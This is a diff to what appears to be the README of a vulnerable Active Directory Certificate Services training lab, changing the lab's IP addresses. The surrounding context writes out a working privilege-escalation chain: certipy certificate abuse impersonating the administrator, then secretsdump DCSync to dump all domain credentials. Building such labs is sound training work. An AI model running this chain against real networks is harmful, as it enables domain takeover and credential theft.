@@ -110,10 +110,10 @@ vagrant ssh attacker
 certipy req -u jdoe@serini.lab -p 'Summer2024!' -ca SERINI-CA -target ca.serini.lab -template VulnUserAuth -upn administrator@serini.lab
 
 # Step 2: Authenticate with certificate and get hash
-certipy auth -pfx administrator.pfx -dc-ip 192.168.58.10
+certipy auth -pfx administrator.pfx -dc-ip 192.168.121.10
 
 # Step 3: DCSync - Dump all domain credentials
-secretsdump.py -hashes :HASH_FROM_STEP_2 administrator@192.168.58.10
+secretsdump.py -hashes :HASH_FROM_STEP_2 administrator@192.168.121.10
 ```
 
 Replace `HASH_FROM_STEP_2` with the NT hash you received in step 2.
@@ -124,21 +124,21 @@ Replace `HASH_FROM_STEP_2` with the NT hash you received in step 2.
 ┌─────────────────────┐
 │   Domain Controller │
 │   (dc.serini.lab)   │
-│   192.168.58.10     │
+│   192.168.121.10    │
 └──────────┬──────────┘
            │
            │
 ┌──────────┴──────────┐       ┌─────────────────────┐
 │        CA           │       │   Windows 10 Client │
 │  (ca.serini.lab)    │       │  (win10.serini.lab) │
-│  192.168.58.20      │       │   192.168.58.40     │
+│  192.168.121.20     │       │   192.168.121.40    │
 └─────────────────────┘       └─────────────────────┘
            │
            │
 ┌──────────┴──────────┐
 │   Kali Attacker     │
 │     (attacker)      │
-│   192.168.58.50     │
+│   192.168.121.50    │
 └─────────────────────┘
 ```
 
@@ -268,7 +268,7 @@ vagrant ssh dc -c "ipconfig"
 ```bash
 # From attacker VM
 vagrant ssh attacker
-ping 192.168.58.10  # Should reach DC
+ping 192.168.121.10  # Should reach DC
 ```
 
 ### Ansible Connection Errors
